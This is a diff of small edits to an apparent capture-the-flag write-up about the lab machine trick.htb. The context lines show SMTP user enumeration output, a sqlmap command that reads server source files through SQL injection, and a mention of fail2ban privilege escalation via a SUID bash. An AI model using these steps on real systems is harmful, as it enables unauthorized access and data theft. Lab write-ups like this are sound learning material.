@@ -59,7 +59,7 @@ for i in users:
         print(vrfy)
 ```
 So I could find michael ahead of time  
-```
+```bash
 python3 smtp_brute.py
 (252, b'2.0.0 michael')
 ```
@@ -117,7 +117,7 @@ grep 'server_name\|root' /home/blnkn/.local/share/sqlmap/output/preprod-payroll.
 ```
 this uncovers a new vhost - preprod-marketing  
 [http://preprod-marketing.trick.htb/index.php](http://preprod-marketing.trick.htb/index.php)  
-because we now have the web folder paths we can now dump the source code  
+because we now have the web folder paths we can dump the source code  
 ```bash
 sqlmap -r save_deductions.req --batch --threads 10 --file-read /var/www/market/index.php  
 ```
@@ -199,6 +199,11 @@ drwxr-xr-x   2 root root      4096 Sep 17 16:36 jail.d
 -rw-r--r--   1 root root      2827 Sep 17 16:36 paths-common.conf
 -rw-r--r--   1 root root       573 Sep 17 16:36 paths-debian.conf
 -rw-r--r--   1 root root       738 Sep 17 16:36 paths-opensuse.conf
+```
+because he's part of the "security" group  
+```bash
+groups
+michael security
 ```
 a quick google search for "fail2ban privesc" an we know we can execute arbitrary command with this  
 let's try to make a bash suid  
